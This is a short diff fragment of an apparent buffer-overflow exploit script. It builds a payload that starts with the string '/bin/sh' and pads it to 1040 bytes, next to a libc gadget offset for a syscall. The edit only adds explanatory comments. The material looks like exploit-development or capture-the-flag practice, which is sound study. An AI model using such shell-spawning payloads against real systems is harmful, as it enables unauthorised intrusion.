@@ -16,10 +16,10 @@ g5 = LIBC_OFFSET + 0x3f3b1 # sti ; syscall (0x3f3b0)
 
 
 
-shellcode = struct.pack('<q', 0x0068732f6e69622f) 
+shellcode = struct.pack('<q', 0x0068732f6e69622f) #We add "/bin/sh",0 at the start of the buffer
 
 shellcode += 'A'*(1039)
-shellcode += 'B'
+shellcode += 'B' #We add 1040 characters
 #shellcode += 'B'
 
 
